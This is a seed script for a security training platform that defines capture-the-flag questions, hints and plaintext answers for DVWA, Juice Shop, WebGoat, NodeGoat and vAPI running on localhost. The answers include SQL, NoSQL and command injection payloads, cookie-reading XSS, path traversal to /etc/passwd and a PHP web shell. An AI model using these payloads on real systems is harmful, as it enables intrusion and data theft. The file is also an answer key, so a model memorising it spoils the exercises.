const crypto = require('crypto');
const bcrypt = require('bcrypt');

const labs = [
  {
    id: '19200b65-cad3-4667-9c99-67a384e89b73',
    name: 'vAPI - API Security',
    slug: 'vapi-api-security',
    description: 'REST API security testing with vAPI on port 3000',
    flags: [
      {
        question: 'Run: curl http://localhost:3000/api/users. What HTTP status code or message is returned when accessing the users endpoint without authentication?',
        hint: 'curl http://localhost:3000/api/users',
        answer: 'curl http://localhost:3000/api/users',
        value: 'API_ENDPOINT_FOUND'
      },
      {
        question: 'Run: curl -X GET http://localhost:3000/api/admin. What response do you get when accessing the admin endpoint without an Authorization header?',
        hint: 'curl -X GET http://localhost:3000/api/admin',
        answer: 'curl -X GET http://localhost:3000/api/admin',
        value: 'BROKEN_AUTH_DETECTED'
      },
      {
        question: 'Run: curl http://localhost:3000/api/users/1 and then curl http://localhost:3000/api/users/2. Do both requests return different user data? What fields are exposed?',
        hint: 'curl http://localhost:3000/api/users/1 && curl http://localhost:3000/api/users/2',
        answer: 'curl http://localhost:3000/api/users/1',
        value: 'IDOR_EXPLOITED'
      },
      {
        question: 'Run: curl -X POST http://localhost:3000/api/register -H "Content-Type: application/json" -d {"username":"test","password":"test123","role":"admin"}. What response is returned when you add an extra role field?',
        hint: 'curl -X POST http://localhost:3000/api/register -H "Content-Type: application/json" -d {"username":"test","password":"test123","role":"admin"}',
        answer: 'curl -X POST http://localhost:3000/api/register -H "Content-Type: application/json" -d {"username":"test","password":"test123","role":"admin"}',
        value: 'MASS_ASSIGNMENT_FOUND'
      },
      {
        question: 'Run: curl "http://localhost:3000/api/products?id=1 OR 1=1". What product data is returned when injecting a tautology in the query parameter?',
        hint: 'curl "http://localhost:3000/api/products?id=1 OR 1=1"',
        answer: 'curl "http://localhost:3000/api/products?id=1 OR 1=1"',
        value: 'SQLI_IN_API_FOUND'
      },
      {
        question: 'Run: curl -v http://localhost:3000/api/users/1. What sensitive information (email, phone, internal IDs) is returned in the response body?',
        hint: 'curl -v http://localhost:3000/api/users/1',
        answer: 'curl -v http://localhost:3000/api/users/1',
        value: 'EXCESSIVE_DATA_EXPOSURE'
      },
      {
        question: 'Run: for i in $(seq 1 10); do curl -s -o /dev/null -w "%{http_code} " http://localhost:3000/api/login -X POST -H "Content-Type: application/json" -d {"username":"admin","password":"wrong"}; done. What HTTP codes appear after rapid login attempts?',
        hint: 'for i in $(seq 1 10); do curl -s -o /dev/null -w "%{http_code} " http://localhost:3000/api/login -X POST -H "Content-Type: application/json" -d {"username":"admin","password":"wrong"}; done',
        answer: 'curl -s -o /dev/null -w "%{http_code} " http://localhost:3000/api/login -X POST -H "Content-Type: application/json" -d {"username":"admin","password":"wrong"}',
        value: 'RATE_LIMIT_TESTED'
      },
      {
        question: 'Run: curl http://localhost:3000/api/protected -H "Authorization: Bearer invalid.token.here". What error message is returned for an invalid JWT?',
        hint: 'curl http://localhost:3000/api/protected -H "Authorization: Bearer invalid.token.here"',
        answer: 'curl http://localhost:3000/api/protected -H "Authorization: Bearer invalid.token.here"',
        value: 'JWT_VULN_TESTED'
      },
      {
        question: 'Run: curl http://localhost:3000/api/swagger.json or curl http://localhost:3000/api/docs. What API documentation endpoint is publicly accessible?',
        hint: 'curl http://localhost:3000/api/swagger.json',
        answer: 'curl http://localhost:3000/api/swagger.json',
        value: 'API_DOCS_EXPOSED'
      }
    ]
  },
  {
    id: 'fe4537d4-26f0-490d-ab31-d0bf480438c0',
    name: 'DVWA - Damn Vulnerable Web App',
    slug: 'dvwa',
    description: 'Damn Vulnerable Web App for web security testing on port 80',
    flags: [
      {
        question: 'Log in to DVWA with admin/password. Navigate to the SQL Injection page. Enter: 1 union select 1,2 in the User ID field. What two numbers appear in the result?',
        hint: 'Enter 1 union select 1,2 in the SQL Injection page User ID field',
        answer: '1 union select 1,2',
        value: 'SQLI UNION_NUMBER_REVEALED'
      },
      {
        question: 'Navigate to DVWA SQL Injection. Enter: 1 union select version(),2 in the User ID field. What database version string is displayed?',
        hint: 'Enter 1 union select version(),2 in the SQL Injection page',
        answer: '1 union select version(),2',
        value: 'DB_VERSION_EXTRACTED'
      },
      {
        question: 'Set DVWA Security to Low. Navigate to Reflected XSS. Enter: <script>alert(1)</script> in the Name field and click Submit. What JavaScript alert message appears?',
        hint: 'Enter <script>alert(1)</script> in the Reflected XSS Name field',
        answer: '<script>alert(1)</script>',
        value: 'REFLECTED_XSS_CONFIRMED'
      },
      {
        question: 'Set DVWA Security to Low. Navigate to Stored XSS. Enter: <script>alert(document.cookie)</script> in the Name or Message field and submit. What cookie value is shown in the alert?',
        hint: 'Enter <script>alert(document.cookie)</script> in the Stored XSS field',
        answer: '<script>alert(document.cookie)</script>',
        value: 'STORED_XSS_CONFIRMED'
      },
      {
        question: 'Navigate to DVWA Command Injection. Enter: 127.0.0.1; cat /etc/hosts in the IP field. What host entries are displayed in the response?',
        hint: 'Enter 127.0.0.1; cat /etc/hosts in the Command Injection IP field',
        answer: '127.0.0.1; cat /etc/hosts',
        value: 'CMD_INJECTION_EXPLOITED'
      },
      {
        question: 'Navigate to DVWA File Inclusion. Change the URL to include: ../../../../etc/passwd in the filename parameter. What system user entries (lines with /bin/bash) appear?',
        hint: 'Change filename parameter to ../../../../etc/passwd',
        answer: '../../../../etc/passwd',
        value: 'FILE_INCLUSION_EXPLOITED'
      },
      {
        question: 'Navigate to DVWA CSRF. Set DVWA Security to Low. Note the current password change form. Enter a new password in the field and submit. What confirmation message appears on the page?',
        hint: 'Use the CSRF page to change the password and observe the confirmation',
        answer: 'password_changed',
        value: 'CSRF_ATTACK_CONFIRMED'
      },
      {
        question: 'Navigate to DVWA File Upload. Upload a PHP file named shell.php with content: <?php echo shell_exec($_GET[cmd]); ?>. What success message is returned after upload?',
        hint: 'Upload a PHP shell file to the File Upload page',
        answer: '<?php echo shell_exec($_GET[cmd]); ?>',
        value: 'FILE_UPLOAD_SUCCESS'
      },
      {
        question: 'Navigate to DVWA Brute Force. Use Burp or manual login with admin and common passwords. After several attempts, what lockout or rate-limit message appears if any?',
        hint: 'Try multiple login attempts on the Brute Force page',
        answer: 'admin password',
        value: 'BRUTE_FORCE_TESTED'
      }
    ]
  },
  {
    id: 'ec751ad2-399b-4ec8-8556-ac12cb4d231a',
    name: 'Juice Shop',
    slug: 'juice-shop',
    description: 'OWASP Juice Shop vulnerable web application on port 3000',
    flags: [
      {
        question: 'Run: curl http://localhost:3000/score-board. What scoring page URL path returns a list of challenge names and their states?',
        hint: 'curl http://localhost:3000/score-board',
        answer: 'curl http://localhost:3000/score-board',
        value: 'SCOREBOARD_FOUND'
      },
      {
        question: 'Run: curl http://localhost:3000/rest/products/search?q=easter. What product name is returned that references a hidden Easter Egg?',
        hint: 'curl http://localhost:3000/rest/products/search?q=easter',
        answer: 'curl http://localhost:3000/rest/products/search?q=easter',
        value: 'EASTER_EGG_PRODUCT_FOUND'
      },
      {
        question: 'Run: curl -X POST http://localhost:3000/rest/user/login -H "Content-Type: application/json" -d {"email":"admin@juice-sh.op","password":"admin"} or try SQL injection: {"email":"admin@juice-sh.op" --","password":"x"}. What error or success message is returned?',
        hint: 'curl -X POST http://localhost:3000/rest/user/login -H "Content-Type: application/json" -d {"email":"admin@juice-sh.op","password":"admin"}',
        answer: 'curl -X POST http://localhost:3000/rest/user/login -H "Content-Type: application/json" -d {"email":"admin@juice-sh.op","password":"admin"}',
        value: 'ADMIN_CREDENTIALS_CRACKED'
      },
      {
        question: 'Run: curl http://localhost:3000/api/Products. Find a product description field that contains HTML or script tags. What XSS payload string is embedded?',
        hint: 'curl http://localhost:3000/api/Products',
        answer: 'curl http://localhost:3000/api/Products',
        value: 'PERSISTED_XSS_FOUND'
      },
      {
        question: 'Run: curl http://localhost:3000/rest/coupon-placeholders or try entering coupon code: JAN19- in the coupon field at checkout. What discount percentage does the coupon apply?',
        hint: 'curl http://localhost:3000/rest/coupon-placeholders',
        answer: 'curl http://localhost:3000/rest/coupon-placeholders',
        value: 'COUPON_CODE_EXPLOITED'
      },
      {
        question: 'Run: curl -X POST http://localhost:3000/api/Users -H "Content-Type: application/json" -d {"email":"test@test.com","password":"test123"}. What verbose error message reveals about the database or validation?',
        hint: 'curl -X POST http://localhost:3000/api/Users -H "Content-Type: application/json" -d {"email":"test@test.com","password":"test123"}',
        answer: 'curl -X POST http://localhost:3000/api/Users -H "Content-Type: application/json" -d {"email":"test@test.com","password":"test123"}',
        value: 'VERBOSE_ERROR_FOUND'
      },
      {
        question: 'Run: curl http://localhost:3000/administration or curl http://localhost:3000/#/administration. What admin panel page loads that shows user accounts or system status?',
        hint: 'curl http://localhost:3000/administration',
        answer: 'curl http://localhost:3000/administration',
        value: 'ADMIN_PAGE_ACCESSED'
      },
      {
        question: 'Open browser DevTools network tab and perform a search on Juice Shop. In the search request URL, what sensitive data parameter (like session token or API key) is visible in the query string?',
        hint: 'Perform a search and check the URL query parameters in DevTools',
        answer: 'search_query_in_url',
        value: 'SENSITIVE_DATA_IN_URL'
      },
      {
        question: 'Run: curl http://localhost:3000/ftp. What files are listed on the FTP placeholder page? What file contains encoded credentials?',
        hint: 'curl http://localhost:3000/ftp',
        answer: 'curl http://localhost:3000/ftp',
        value: 'FTP_FILES_LISTED'
      }
    ]
  },
  {
    id: 'f85ec687-5b86-40e2-a73b-5366652a4b10',
    name: 'WebGoat',
    slug: 'webgoat',
    description: 'OWASP WebGoat web security training on port 8080',
    flags: [
      {
        question: 'Navigate to WebGoat at http://localhost:8080/WebGoat. Go to the SQL Injection section under Injection Flaws. Enter: Smith in the Last Name field. What rows appear in the result table?',
        hint: 'Enter Smith in the SQL Injection Basic lesson Last Name field',
        answer: 'Smith',
        value: 'SQLI_BASIC_COMPLETED'
      },
      {
        question: 'Navigate to the HTML Injection lesson. View the page source (right-click, View Page Source). What hidden input field names or values are embedded in the form?',
        hint: 'View page source in the HTML Injection lesson',
        answer: 'view_page_source',
        value: 'HIDDEN_FIELDS_FOUND'
      },
      {
        question: 'Navigate to the XXE Injection lesson. Submit a request with an XML body that defines an external entity referencing /etc/passwd. What file content is returned in the response?',
        hint: 'Use the XXE lesson to inject an external entity for /etc/passwd',
        answer: 'xxe_injection_payload',
        value: 'XXE_VULN_EXPLOITED'
      },
      {
        question: 'Navigate to the Insecure Deserialization lesson. Examine the serialized Java object in the request. What class name or object type is being serialized?',
        hint: 'Inspect the serialized object in the Deserialization lesson',
        answer: 'serialized_java_object',
        value: 'DESERIALIZATION_FOUND'
      },
      {
        question: 'Navigate to the Authentication section. Try logging in with admin and password in the Broken Authentication lesson. What error message reveals information about valid usernames?',
        hint: 'Try login with wrong credentials on Broken Authentication lesson',
        answer: 'admin wrong_password',
        value: 'AUTH_BYPASS_TESTED'
      },
      {
        question: "Navigate to the Path Traversal lesson. Enter: ../../../etc/passwd in the file input field. What system file content or error message is returned?",
        hint: 'Enter ../../../etc/passwd in the Path Traversal file input',
        answer: '../../../etc/passwd',
        value: 'PATH_TRAVERSAL_EXPLOITED'
      },
      {
        question: 'Navigate to the JWT lesson. Decode the JWT token from the authorization header using a base64 decoder. What algorithm and payload data does the token contain?',
        hint: 'Decode the JWT token payload from the authorization header',
        answer: 'jwt_decode_payload',
        value: 'JWT_TOKEN_WEAKNESS'
      },
      {
        question: 'Navigate to the CORS lesson. Submit a request from a different origin. What response headers (Access-Control-Allow-Origin) are returned that indicate misconfigured CORS?',
        hint: 'Check CORS response headers in the CORS lesson',
        answer: 'access_control_allow_origin',
        value: 'CORS_MISCONFIG_FOUND'
      },
      {
        question: 'Navigate to the DOM-Based XSS lesson. Enter: <img src=x onerror=alert(1)> in the input field. What JavaScript execution or alert is triggered in the browser?',
        hint: 'Enter an img tag with onerror in the DOM XSS lesson',
        answer: '<img src=x onerror=alert(1)>',
        value: 'DOM_XSS_TRIGGERED'
      }
    ]
  },
  {
    id: '9c861331-b3f2-4322-94d5-bc64f312f46e',
    name: 'NodeGoat',
    slug: 'nodegoat',
    description: 'OWASP NodeGoat Node.js vulnerable application on port 4000',
    flags: [
      {
        question: 'Run: curl -sI http://localhost:4000. What Node.js version number is revealed in the X-Powered-By or Server response header?',
        hint: 'curl -sI http://localhost:4000',
        answer: 'curl -sI http://localhost:4000',
        value: 'NODE_VERSION_LEAKED'
      },
      {
        question: 'Run: curl -X POST http://localhost:4000/api/contributions -H "Content-Type: application/json" -d {"userId":"1","amount":{"$gt":""}}. What contribution data is returned when using a NoSQL injection operator?',
        hint: 'curl -X POST http://localhost:4000/api/contributions -H "Content-Type: application/json" -d {"userId":"1","amount":{"$gt":""}}',
        answer: 'curl -X POST http://localhost:4000/api/contributions -H "Content-Type: application/json" -d {"userId":"1","amount":{"$gt":""}}',
        value: 'NOSQL_INJECTION_EXPLOITED'
      },
      {
        question: 'Run: curl http://localhost:4000/api/contributions/1 and then curl http://localhost:4000/api/contributions/2. Can you access another user contribution by changing the ID parameter? What data is returned?',
        hint: 'curl http://localhost:4000/api/contributions/1 && curl http://localhost:4000/api/contributions/2',
        answer: 'curl http://localhost:4000/api/contributions/1',
        value: 'IDOR_EXPLOITED'
      },
      {
        question: 'Run: curl -X POST http://localhost:4000/api/contributions -H "Content-Type: application/json" -d {"userId":"1","amount":100} and then try {"userId":{"$ne":"1"},"amount":100}. What happens when injecting MongoDB operators in the userId field?',
        hint: 'curl -X POST http://localhost:4000/api/contributions -H "Content-Type: application/json" -d {"userId":{"$ne":"1"},"amount":100}',
        answer: 'curl -X POST http://localhost:4000/api/contributions -H "Content-Type: application/json" -d {"userId":{"$ne":"1"},"amount":100}',
        value: 'MONGO_INJECTION_POINT'
      },
      {
        question: 'Run: curl http://localhost:4000/api/contributions. What JSON data structure with user IDs and amounts is returned by the REST API?',
        hint: 'curl http://localhost:4000/api/contributions',
        answer: 'curl http://localhost:4000/api/contributions',
        value: 'REST_API_DATA_EXTRACTED'
      },
      {
        question: 'Log in to NodeGoat and check your browser cookies. Set the session cookie value to another logged-in user session. What happens when you access the profile page with a different session ID?',
        hint: 'Modify the session cookie to another user session ID',
        answer: 'modify_session_cookie',
        value: 'SESSION_FIXATION_TESTED'
      },
      {
        question: 'Navigate to the Profile page. In the name field, enter: <script>alert(document.cookie)</script> and save the profile. When viewing the profile, what JavaScript alert or content is rendered?',
        hint: 'Enter a script tag in the profile name field and view the profile',
        answer: '<script>alert(document.cookie)</script>',
        value: 'XSS_IN_PROFILE_FOUND'
      },
      {
        question: 'Run: curl http://localhost:4000/api/contributions/1 -X PUT -H "Content-Type: application/json" -d {"userId":"1","amount":999999}. What response is returned when attempting to modify another user contribution?',
        hint: 'curl http://localhost:4000/api/contributions/1 -X PUT -H "Content-Type: application/json" -d {"userId":"1","amount":999999}',
        answer: 'curl http://localhost:4000/api/contributions/1 -X PUT -H "Content-Type: application/json" -d {"userId":"1","amount":999999}',
        value: 'CONTRIBUTION_TAMPERED'
      },
      {
        question: 'Run: curl http://localhost:4000/api/contributions?userId=1. What contribution amounts and user details are returned when querying with a specific userId parameter?',
        hint: 'curl http://localhost:4000/api/contributions?userId=1',
        answer: 'curl http://localhost:4000/api/contributions?userId=1',
        value: 'CONTRIBUTOR_DATA_EXPOSED'
      }
    ]
  }
];

function validateDescription(desc, labName, flagQuestion) {
  if (desc.includes("'")) {
    throw new Error(`Single quote found in description for [${labName}] ${flagQuestion}`);
  }
  if (desc.includes('\\')) {
    throw new Error(`Backslash found in description for [${labName}] ${flagQuestion}`);
  }
}

for (const lab of labs) {
  for (const flag of lab.flags) {
    validateDescription(flag.question, lab.name, flag.question);
  }
}

function hashAnswer(answer) {
  return bcrypt.hashSync(
    answer.trim().toLowerCase().replace(/[\s,;]+/g, ' ').trim(),
    10
  );
}

for (const lab of labs) {
  const labInsert = `INSERT INTO "Lab" ("id", "name", "slug", "description", "createdAt", "updatedAt") VALUES ('${lab.id}', '${lab.name}', '${lab.slug}', '${lab.description}', NOW(), NOW()) ON CONFLICT ("id") DO NOTHING;`;
  console.log(labInsert);

  for (let i = 0; i < lab.flags.length; i++) {
    const flag = lab.flags[i];
    const flagId = crypto.randomUUID();
    const hash = hashAnswer(flag.answer);

    const insert = `INSERT INTO "Flag" ("id", "labId", "position", "question", "hint", "answerHash", "value", "points", "createdAt", "updatedAt") VALUES ('${flagId}', '${lab.id}', ${i + 1}, '${flag.question.replace(/'/g, "''")}', '${flag.hint.replace(/'/g, "''")}', '${hash}', '${flag.value}', ${(i + 1) * 10}, NOW(), NOW()) ON CONFLICT ("id") DO NOTHING;`;
    console.log(insert);
  }
}
